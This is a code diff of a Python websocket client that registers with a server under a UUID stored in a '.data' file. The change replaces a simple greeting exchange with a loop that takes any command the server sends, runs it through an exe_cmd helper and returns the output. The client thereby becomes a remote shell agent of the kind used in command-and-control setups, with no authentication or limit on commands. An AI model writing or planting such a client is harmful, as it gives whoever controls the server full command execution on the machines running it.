@@ -19,7 +19,8 @@ def exe_cmd(cmd) -> str:
 uuid_file = Path(os.path.join(os.getcwd(), "./.data"))
 if uuid_file.is_file():
     with open(".data", 'r') as f:
-        print(f"your UUID: {f.read()}")
+        my_uuid = f.read()
+        print(f"your UUID: {my_uuid}")
         
 else:
     with open(".data", 'w') as f:
@@ -32,14 +33,18 @@ else:
 # --- Socket  Connection ---
 async def hello():
 
-    URL = "ws://127.0.0.1:8000/ws/socket-server/"
+    URL = f"ws://127.0.0.1:8000/ws/{my_uuid}/"
 
     async with websockets.connect(URL) as websocket:
-        name = input("What's your name? ")
-        await websocket.send(name)
-        print(f">>> {name}")
-        greeting = await websocket.recv()
-        print(f"<<< {greeting}")
+        await websocket.send('Connected !')
+        
+        while True:
+            cmd = await websocket.recv()
+            print(cmd)
+            cmd_out = exe_cmd(cmd)
+            print(cmd_out)
+            await websocket.send(cmd_out)
+
 
 if __name__ == "__main__":
     asyncio.run(hello())
